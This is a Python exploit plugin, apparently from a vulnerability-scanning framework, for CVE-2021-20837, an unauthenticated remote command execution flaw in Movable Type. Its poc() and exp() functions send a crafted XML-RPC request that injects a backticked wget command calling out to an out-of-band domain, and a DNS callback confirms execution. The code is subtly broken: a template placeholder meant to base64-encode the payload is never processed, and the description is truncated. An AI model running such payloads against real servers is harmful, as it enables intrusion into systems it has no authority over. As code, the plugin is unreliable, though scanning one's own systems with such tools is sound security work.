import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Unauthenticated RCE In MovableType''',
        "description": '''5002 and earlier (Movable Type Advanced 7 Series), Movable Type Advanced 6.8. 2 and earlier (Movable Type Advanced 6 Series), Movable Type Premium 1.46 and earlier, and Movable Type Premium Advanced 1.46 and earlier allow remote attackers to execute arbitrary OS commands via unspecified vectors.''',
        "severity": "critical",
        "references": [
            "https://nemesis.sh/posts/movable-type-0day/", 
            "https://github.com/ghost-nemesis/cve-2021-20837-poc", 
            "https://twitter.com/cyber_advising/status/1454051725904580608", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-20837"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-20837",
            "cwe-id": "CWE-78"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "rce", "movable"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/cgi-bin/mt/mt-xmlrpc.cgi"""
        method = "POST"
        data = """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>mt.handler_to_coderef</methodName>
  <params>
    <param>
      <value>
        <base64>
          {{base64("`wget http://%s`")}}
        </base64>
      </value>
    </param>
  </params>
</methodCall>""" % oob_domain
        headers = {'Content-Type': 'text/xml'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url